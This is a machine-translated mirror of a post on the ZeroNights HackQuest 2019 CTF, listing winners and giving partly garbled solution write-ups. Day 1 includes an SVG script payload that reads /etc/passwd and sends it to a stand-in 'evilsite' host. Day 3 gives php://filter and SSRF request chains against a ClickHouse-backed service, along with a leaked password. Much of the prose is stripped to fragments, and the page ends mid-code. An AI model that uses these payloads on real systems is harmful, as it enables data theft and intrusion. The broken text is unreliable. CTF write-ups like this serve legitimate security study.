<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🦇 🥒 📰 ZeroNights Hackquest2019。結果と記事 🔢 🙆🏿 💛</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ごく最近、ZeroNightsカンファレンスに捧げられる年次HackQuestが終了しました。前年と同様に、参加者は7つの異なるタスクを解決する必要がありました。いつものように、割り当てはコミュニティパートナーの準備に役立ちました。カットの下で、タスクがどのように解決されたのか、そして今度はハックク...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>ZeroNights Hackquest2019。結果と記事</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472416/"><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ごく最近、ZeroNightsカンファレンスに捧げられる年次HackQuestが終了しました。</font><font style="vertical-align: inherit;">前年と同様に、参加者は7つの異なるタスクを解決する必要がありました。</font><font style="vertical-align: inherit;">いつものように、割り当てはコミュニティパートナーの準備に役立ちました。</font><font style="vertical-align: inherit;">カットの下で、タスクがどのように解決されたのか、そして今度はハッククエストの勝者となったのがわかります。</font></font></p><br>
<img src="https://habrastorage.org/webt/fg/tn/kk/fgtnkkl6yedcvzkmsnb_koppplo.jpeg" alt="画像"><br>
<a name="habracut"></a><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1日目：TOP SECRET</font></font></h2><br>
<div class="scrollable-table"><table>
<tbody><tr>
<td colspan="3" align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">勝者</font></font></td>
</tr>
<tr>
<td align="center"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1位</font></font></b></td>
<td align="center"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2位</font></font></b></td>
</tr>
<tr>
<td align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ウラジス</font></font></td>
<td align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ゴダスワグ</font></font></td>
</tr>
</tbody></table></div><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">今年の最初の課題は、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">デジタルセキュリティ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">監査チームによって準備されました</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">これを解決するには、参加者は3つの段階を経る必要がありました。ゲームポータルの内部チャットのコンテンツにアクセスし、Discordボットの脆弱性を悪用し、Kubernetesクラスターで誤った権限設定を使用しました。</font></font></p><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">初日のタスクの決定（vladvis）</font></font></b><div class="spoiler_text"><h2>1- : graphql</h2><br>
<ul>
<li>       js client-side   .<br>
<img src="https://habrastorage.org/getpro/habr/post_images/9cf/5f7/9b1/9cf5f79b1b46572ab7a9672cd2aab2b1.png"></li>
<li>      1 :<br>
<img src="https://habrastorage.org/getpro/habr/post_images/751/d40/d27/751d40d27d15215ce845b84c9a9a9c06.png"></li>
<li>         :<br>
<pre><code class="plaintext hljs">{<font></font>
__schema {<font></font>
  types<font></font>
  {<font></font>
    name<font></font>
    fields<font></font>
    {<font></font>
      name<font></font>
    }<font></font>
  }<font></font>
}<font></font>
}</code></pre></li>
<li>  comment,           .</li>
</ul><br>
<h2>2- : Discord bot</h2><br>
<ul>
<li>         <br>
<img src="https://habrastorage.org/getpro/habr/post_images/956/219/d71/956219d717f189f25cc3a61c749a8c18.png"></li>
<li>    SSRF  gitea,         =(</li>
<li>   :<br>
<pre><code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1"<font></font>
 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;<font></font>
&lt;script type="text/javascript"&gt;<font></font>
for (var i=0; trefs[i]; i++) {<font></font>
  var xhr = new XMLHttpRequest();<font></font>
  xhr.open("GET","/etc/passwd",false);<font></font>
  xhr.send("");<font></font>
  var xhr2 = new XMLHttpRequest();<font></font>
  xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false);<font></font>
  xhr2.send("");<font></font>
}<font></font>
&lt;/script&gt;<font></font>
&lt;/svg&gt;</code></pre></li>
<li> /etc/passwd   2 : worker,     svg  gitea<br>
<pre><code class="plaintext hljs">worker:x:1000:1000::/home/worker:/bin/sh<font></font>
gitea:x:1001:1001::/home/gitea:/bin/sh</code></pre></li>
<li>     unintended :  .bash_history  worker    ssh-      <br>
<pre><code class="plaintext hljs">cd<font></font>
nano .ssh/connect_info <font></font>
echo &gt; .bash_history <font></font>
exit<font></font>
cd <font></font>
cd .ssh/<font></font>
chmod 755 id_rsa <font></font>
ls -al<font></font>
cat id_rsa <font></font>
exit</code></pre><br>
<h2>3- : kubernetes</h2></li>
<li>    , , . .bash_history  ps        ,    ip   <br>
<img src="https://habrastorage.org/getpro/habr/post_images/225/584/a43/225584a43fca0887057424b64a1ee1b4.jpg"></li>
<li> mount     kubernetes<br>
<img src="https://habrastorage.org/getpro/habr/post_images/4d5/d0b/87e/4d5d0b87ed9b52c107a3d536cfb07f08.png"></li>
<li>  ,   ,     …   -       </li>
<li>    ,    ,      rest api kubernetes-</li>
<li>    ,      ,   -, ,  cmdline   ,      <del></del>    socks   ssh</li>
<li>  <code>kubectl get pods</code>    ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> kubernetes</a> ,    exec    ,    docker-</li>
<li>  1.5    socks ,     websocket  exec.       kubectl  ssh<br>
<img src="https://habrastorage.org/getpro/habr/post_images/f49/096/be8/f49096be8b3c769802f612325f70e7ba.png"></li>
<li>               namespace zn2 (    namespace zn1),     redis</li>
<li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">@paulaxe</a>   Zeronights   RCE, ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> PoC-</a></li>
<li>  ,     kubernetes secrets<br>
<img src="https://habrastorage.org/getpro/habr/post_images/71e/49d/172/71e49d172f647b8311233e5646dd9170.png"></li>
</ul></div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2日目：MICOSOFT LUNIX</font></font></h2><br>
<div class="scrollable-table"><table>
<tbody><tr>
<td colspan="3" align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">勝者</font></font></td>
</tr>
<tr>
<td align="center"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1位</font></font></b></td>
<td align="center"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2位</font></font></b></td>
<td align="center"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3位</font></font></b></td>
</tr>
<tr>
<td align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破れた</font></font></td>
<td align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">罪__</font></font></td>
<td align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AV1ct0r</font></font></td>
</tr>
<tr>
<td colspan="3" align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">また決定：demidov_al、gotdaswag、medidrdrider、groke_is_love_groke_is_life</font></font></td>
</tr>
</tbody></table></div><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2日目の割り当ては、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">r0クルー</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コミュニティのメンバーによって準備されました</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">これを解決するには、カーネルを変更したLinuxイメージのアクティベーションキーを生成する必要があります。</font></font></p><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2日目のタスクの決定（引き裂かれた）</font></font></b><div class="spoiler_text"><p>:  <code>jD74nd8_task2.iso</code>,  ISO .      ,   Linux:   <code>boot/kernel.xz</code>,   <code>boot/rootfs.xz</code>   <code>boot/syslinux/</code>.</p><br>
<p>    .   —  cpio ,  xz.  ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a>.        :</p><br>
<pre><code class="plaintext hljs">&gt; file kernel.xz                   <font></font>
kernel.xz: Linux kernel x86 boot executable bzImage, version 5.0.11 (billy@micosoft.com) #1 SMP Sat Aug 25 13:37:00 CEST 2019, RO-rootFS, swap_dev 0x2, Normal VGA</code></pre><br>
<p>   iso    <code>minimal/rootfs/bin/activator</code>:              <code>/dev/activate</code>   <code>$email|$key</code>.     ,   <code>/dev/activate</code>    <code>ACTIVATED</code>,        2048.</p><br>
<p>      .      KVM:</p><br>
<pre><code class="plaintext hljs">&gt; qemu-system-x86_64 -enable-kvm -drive format=raw,media=cdrom,readonly,file=jD74nd8_task2.iso</code></pre><br>
<p>Linux     <code>/bin/activator</code>  overlay.    <code>/etc/inittab</code>.       ,     ,  ,  <code>/proc</code>  <code>/sys</code>.         iso   ,     .  <code>sleep 1</code>  <code>/bin/sh</code>, ..       .</p><br>
<p>  : ,  <code>/proc/kallsyms</code> , ..   .  ,  ,    ,   .     <code>/dev/activator</code>:</p><br>
<pre><code class="plaintext hljs">/ # ls -la /dev/activate<font></font>
crw-------    1 0        0         252,   0 Oct 15 08:57 /dev/activate<font></font>
/ # cat /proc/devices<font></font>
Character devices:<font></font>
...<font></font>
252 activate<font></font>
...<font></font>
<font></font>
Block devices:<font></font>
...</code></pre><br>
<p>   <code>/proc/devices</code> ,    (char) ,   major  252  minor — 0.</p><br>
<p>         ,      <code>write</code>.         <code>activate</code>.      ,   - .</p><br>
<p>     ,     : <code>cdev_add</code>  <code>register_chrdev</code>.        <code>/dev/console</code>            (   5.0.11,   ,    ).   ,  ,      major  252.       .</p><br>
<p>   -   :</p><br>
<pre><code class="plaintext hljs">/ # ls -la /sys/dev/char/252:0<font></font>
lrwxrwxrwx    1 0        0                0 Oct 15 09:00 /sys/dev/char/252:0 -&gt; ../../devices/virtual/EEy????I/activate</code></pre><br>
<p>   —   <code>EEy????I</code>.          ! </p><br>
<p><img src="https://habrastorage.org/webt/ww/2x/pa/ww2xpaeiblwxlyive4ytkkdp4iq.png"></p><br>
<p>       ,    ,   .   ,   ,  ,          <code>activate</code>,    XOR.</p><br>
<p>   :</p><br>
<p><img src="https://habrastorage.org/webt/wr/gj/le/wrgjlelw6zor474zwwy2eins8zw.png"></p><br>
<p>   ,    :</p><br>
<p><img src="https://habrastorage.org/webt/go/sh/vm/goshvmqukonyiv69nltp_g9xrlw.png"></p><br>
<p>     ,          <code>0xFFFFFFFF811F094B</code>     ,   ,    .    qemu   <code>-s</code>.    qemu  gdb stub,     gdb .        IDA Pro,   .         gdb.</p><br>
<p> ,     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>.         .</p><br>
<p><img src="https://habrastorage.org/webt/ql/cc/f1/qlccf1qgfqvp3mimbbuyazih4de.png"></p><br>
<p><img src="https://habrastorage.org/webt/jh/ui/br/jhuibrua89zngguxpedg0oco8h8.png"></p><br>
<p>      KASLR,        ,     .    (                 ) ,     ,    . ,    .      .</p><br>
<p><img src="https://habrastorage.org/webt/ef/yp/vg/efypvgwh0kyc2zi999ucriitvt8.png"></p><br>
<p><img src="https://habrastorage.org/webt/nt/ny/wa/ntnywaix5hh2hptggey0gk9a8fi.png"></p><br>
<p><img src="https://habrastorage.org/webt/q4/4c/tm/q44ctmpm3uzgmm_9tigzw9us4a0.png"></p></div></div><br>
<p>         .     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>.</p><br>
<h2>Day 3. HOUSE OF BECHED</h2><br>
<div class="scrollable-table"><table>
<tbody><tr>
<td align="center"></td>
</tr>
<tr>
<td align="center"><b>1 </b></td>
</tr>
<tr>
<td align="center">blackfan</td>
</tr>
</tbody></table></div><br>
<p>  beched (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">DeteAct</a>).     .         Clickhouse,   php- <code>file_get_contents</code>.</p><br>
<div class="spoiler"><b class="spoiler_title">    (blackfan)</b><div class="spoiler_text"><p>    ,      callback_url.</p><br>
<p><img src="https://habrastorage.org/getpro/habr/post_images/c6c/428/f02/c6c428f02a3ea33075cbe0d5d556ace8.png" alt="https://i.imgur.com/iX65TI3.png"></p><br>
<p>     :</p><br>
<pre><code class="plaintext hljs">http://82.202.226.176/?callback_url=http://attacker.tld/&amp;pan=&amp;amount=&amp;payment_id=</code></pre><br>
<pre><code class="plaintext hljs">POST / HTTP/1.0<font></font>
Host: attacker.tld<font></font>
Connection: close<font></font>
Content-Length: 21<font></font>
Content-Type: application/json<font></font>
<font></font>
amount=0&amp;payment_id=0</code></pre><br>
<p>HTTP- ,     alphanumeric .  :</p><br>
<pre><code class="plaintext hljs">{"result":"Success.","msg":"Response: testresponse"}<font></font>
<font></font>
{"result":"Invalid status code.","msg":"Non-alphanumeric response."}</code></pre><br>
<p>   callback_url data:,test  , ,  ,  PHP.</p><br>
<pre><code class="plaintext hljs">http://82.202.226.176/?callback_url=data:,test&amp;pan=&amp;amount=&amp;payment_id=</code></pre><br>
<p> php://filter          convert.base64-encode,    alphanumeric. -  +, /  =      base64   .</p><br>
<pre><code class="plaintext hljs">http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./index.php<font></font>
http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./includes/db.php</code></pre><br>
<pre><code class="php hljs"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);<font></font>
<font></font>
<span class="hljs-comment">/*
* DB configuration
*/</span><font></font>
<font></font>
$config = [<font></font>
    <span class="hljs-string">'host'</span> =&gt; <span class="hljs-string">'localhost'</span>,
    <span class="hljs-string">'port'</span> </code></pre><br>
<p>   200- ,          localhost.    callback_url    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> DeteAct      ClickHouse</a>,       "HOUSE OF BECHED".</p><br>
<p><img src="https://habrastorage.org/getpro/habr/post_images/5fb/f00/b42/5fbf00b42a4499e928edfd469a81e755.png" alt="https://i.imgur.com/OBn22wi.png"></p><br>
<p>ClickHouse  HTTP-,    ,      SSRF.</p><br>
<p> ,      .</p><br>
<pre><code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code></pre><br>
<pre><code class="xml hljs"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">yandex</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Profiles of settings. --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">profiles</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- Default settibm</span></code></pre><br>
<p>   , ,    ,     .</p><br>
<p><img src="https://habrastorage.org/getpro/habr/post_images/6e8/6f9/35f/6e86f935fc695b845a63aebbbcd76626.png" alt="https://i.imgur.com/5Un6gfj.png"></p><br>
<p>     string.strip_tags.</p><br>
<pre><code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code></pre><br>
<p>         .    zlib.deflate.</p><br>
<pre><code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|zlib.deflate|convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code></pre><br>
<p>     :</p><br>
<pre><code class="php hljs"><span class="hljs-keyword">print</span>(file_get_contents(<span class="hljs-string">'php://filter/convert.base64-decode|convert.base64-decode|zlib.inflate/resource=data:,NCtYaTVWSUFBbVFTRnd1VFoyZ0FCN3hjK0JRU2tDNUt6RXZKejBXMms3QkxETkVsZUNueVNsSnFja1pxU2taK2FYRnFYbjVHYW1JQmZoZWo4a0RBeWtyZkFGME5QajBwcVdtSnBUa2xWRkNFNlJaTUVWSkZRU0JSd1JZNWxGRTFVY3NLYllVa0JiV2NFbXNGUTRYOElv'</span>));</code></pre><br>
<p> ,      ClickHouse  :</p><br>
<pre><code class="plaintext hljs">http://localhost:8123/?query=select%20'xxx'&amp;user=default&amp;password=bechedhousenoheap<font></font>
<font></font>
http://default:bechedhousenoheap@localhost:8123/?query=select%20'xxx'</code></pre><br>
<p>       POST,       .      (      ,   -              )</p><br>
<pre><code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520'xxx'%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code></pre><br>
<p>        :</p><br>
<pre><code class="sql hljs"><span class="hljs-keyword">select</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> system.tables
<span class="hljs-keyword">select</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> system.columns <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>=<span class="hljs-string">'flag4zn'</span>
<span class="hljs-keyword">select</span> bechedflag <span class="hljs-keyword">from</span> flag4zn</code></pre><br>
<pre><code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520bechedflag%252520from%252520flag4zn%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code></pre></div></div><br>
<h2>Day 4. ASR-EHD</h2><br>
<div class="scrollable-table"><table>
<tbody><tr>
<td align="center"></td>
</tr>
<tr>
<td align="center"><b>1 </b></td>
</tr>
<tr>
<td align="center">AV1ct0r</td>
</tr>
</tbody></table></div><br>
<p>      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Digital Security</a>.     ,          .           DH,   LFSR.      TLS-     DH      LFSR    .</p><br>
<div class="spoiler"><b class="spoiler_title">    (AV1ct0r)</b><div class="spoiler_text"><h1 id="day-4--asr-ehd--writeup-by-av1ct0r">Day 4 / ASR-EHD – WriteUp by AV1ct0r</h1><br>
<p>Peter is a little bit paranoid: he always uses encrypted connections. To be sure algorithms are secure Peter uses his own client. He even gave us a traffic dump which was made while using his custom client. Is Peter's connection really secure?</p><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">https://hackquest.zeronights.org/downloads/task4/8Jdl3f_client.tar</a><br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">https://hackquest.zeronights.org/downloads/task4/d8f3ND_dump.tar</a></p><br>
<ol>
<li><p>  client  IDA Pro  ,       flag.jpg   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">https://ssltest.a1exdandy.me:443/</a>.     (    )    . </p><br>
<pre><code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3)<font></font>
{<font></font>
size_t v4; // rsi<font></font>
__int64 v5; // ST48_8<font></font>
int v6; // [rsp+10h] [rbp-450h]<font></font>
int v7; // [rsp+14h] [rbp-44Ch]<font></font>
__int64 v8; // [rsp+20h] [rbp-440h]<font></font>
__int64 v9; // [rsp+28h] [rbp-438h]<font></font>
__int64 v10; // [rsp+30h] [rbp-430h]<font></font>
__int64 v11; // [rsp+38h] [rbp-428h]<font></font>
__int64 v12; // [rsp+40h] [rbp-420h]<font></font>
char ptr; // [rsp+50h] [rbp-410h]<font></font>
unsigned __int64 v14; // [rsp+458h] [rbp-8h]<font></font>
<font></font>
v14 = __readfsqword(0x28u);<font></font>
if ( argc != 3 )<font></font>
return 0xFFFFFFFFLL;<font></font>
v6 = atoi(argv[1]);<font></font>
v7 = atoi(argv[2]);<font></font>
if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 )<font></font>
return 0xFFFFFFFFLL;<font></font>
v8 = 0LL;<font></font>
v9 = 0LL;<font></font>
v10 = 0LL;<font></font>
OPENSSL_init_ssl(0LL, 0LL);<font></font>
OPENSSL_init_crypto(2048LL, 0LL);<font></font>
v11 = ENGINE_get_default_DH(2048LL, 0LL);<font></font>
if ( v11 )<font></font>
{<font></font>
if ( (unsigned int)ENGINE_init(v11) )<font></font>
{<font></font>
  v12 = ENGINE_get_DH(v11);<font></font>
  if ( v12 )<font></font>
  {<font></font>
    v8 = DH_meth_dup(v12);<font></font>
    if ( v8 )<font></font>
    {<font></font>
      if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) )<font></font>
      {<font></font>
        if ( (unsigned int)ENGINE_set_DH(v11, v8) )<font></font>
        {<font></font>
          v5 = TLSv1_2_client_method(v11, v8);<font></font>
          v10 = SSL_CTX_new(v5);<font></font>
          if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") )<font></font>
          {<font></font>
            v9 = BIO_new_ssl_connect(v10);<font></font>
            BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443");<font></font>
            if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 )<font></font>
            {<font></font>
              BIO_ctrl(v9, 101LL, 0LL, 0LL);<font></font>
              BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv);<font></font>
              BIO_printf(v9, "Host: ssltest.a1exdandy.me\n");<font></font>
              BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7);<font></font>
              v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL);<font></font>
              fwrite(&amp;ptr, v4, 1uLL, stdout);<font></font>
            }<font></font>
            else<font></font>
            {<font></font>
              v4 = 1LL;<font></font>
              fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr);<font></font>
            }<font></font>
          }<font></font>
          else<font></font>
          {<font></font>
            v4 = 1LL;<font></font>
            fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr);<font></font>
          }<font></font>
        }<font></font>
        else<font></font>
        {<font></font>
          v4 = 1LL;<font></font>
          fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr);<font></font>
        }<font></font>
      }<font></font>
      else<font></font>
      {<font></font>
        v4 = 1LL;<font></font>
        fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr);<font></font>
      }<font></font>
    }<font></font>
    else<font></font>
    {<font></font>
      v4 = 1LL;<font></font>
      fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr);<font></font>
    }<font></font>
  }<font></font>
  else<font></font>
  {<font></font>
    v4 = 1LL;<font></font>
    fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr);<font></font>
  }<font></font>
}<font></font>
else<font></font>
{<font></font>
  v4 = 1LL;<font></font>
  fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr);<font></font>
}<font></font>
}<font></font>
else<font></font>
{<font></font>
v4 = 1LL;<font></font>
fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr);<font></font>
}<font></font>
if ( v11 )<font></font>
{<font></font>
ENGINE_finish(v11, v4);<font></font>
ENGINE_free(v11);<font></font>
}<font></font>
if ( v8 )<font></font>
DH_meth_free(v8, v4);<font></font>
if ( v10 )<font></font>
SSL_CTX_free(v10, v4);<font></font>
if ( v9 )<font></font>
BIO_free_all(v9, v4);<font></font>
return 0LL;<font></font>
}</code></pre><br>
<p>      ,   dump.pcap   ssl-,    .      heartbleed (      )  ,    .  ,  SSL      ,   DHE-RSA-AES128-SHA256,   RSA    ,       - ( RSA        ).</p><br>
</li>
<li><p>     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">https://ssltest.a1exdandy.me/x</a>,    ,      — 0x82C780B2697A0002 (0x82C780B2:0x7a69 = 178.128.199.130:31337 ).     31337,  ,    3 ,      </p><br>
<pre><code class="plaintext hljs">nc 178.128.199.130 31337<font></font>
Yet another fucking heap task...<font></font>
Command: 1-3<font></font>
1 - Index: - Size:<font></font>
2 - Index:<font></font>
3 - Index: - Length:</code></pre><br>
<p>        , ,  ,    .</p><br>
</li>
<li><p>  client, ,        -:</p><br>
<pre><code class="plaintext hljs">int __fastcall rnd_work(__int64 a1)<font></font>
{<font></font>
__int64 v1; // rsi<font></font>
unsigned int i; // [rsp+10h] [rbp-10h]<font></font>
<font></font>
rnd_read();<font></font>
BN_bin2bn(&amp;RANDOM_512, 512LL, a1);<font></font>
BN_lshift1(a1, a1);<font></font>
v1 = (unsigned int)BITS_ind[0];               // BITS_ind        dd 4096, 4095, 4081, 4069, 0<font></font>
if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[0]) )<font></font>
{<font></font>
for ( i = 0; i &lt;= 4; ++i )<font></font>
{<font></font>
  if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[i]) )<font></font>
  {<font></font>
    v1 = (unsigned int)BITS_ind[i];<font></font>
    BN_clear_bit(a1, v1);<font></font>
  }<font></font>
  else<font></font>
  {<font></font>
    v1 = (unsigned int)BITS_ind[i];<font></font>
    BN_set_bit(a1, v1);<font></font>
  }<font></font>
}<font></font>
}<font></font>
if ( (unsigned int)((signed int)((unsigned __int64)BN_num_bits(a1) + 7) / 8) &gt; 0x200 )<font></font>
{<font></font>
printf("Err!", v1);<font></font>
exit(0);<font></font>
}<font></font>
BN_bn2binpad(a1, &amp;RANDOM_512, 512LL);<font></font>
return rnd_write();<font></font>
}</code></pre><br>
<p>  (512 )   /dev/urandom     state.          :</p><br>
<pre><code class="plaintext hljs">XOR = 2**4096 + 2**4095 + 2**4081 + 2**4069 + 1<font></font>
CMP = 2**4096<font></font>
state *= 2<font></font>
if state &gt; CMP:<font></font>
state ^= XOR</code></pre><br>
<p>      1  ,      1,       5   (XOR).</p><br>
</li>
</ol><br>
<p> pcap, ,   -,   , :</p><br>
<pre><code class="plaintext hljs">dh_g = 2<font></font>
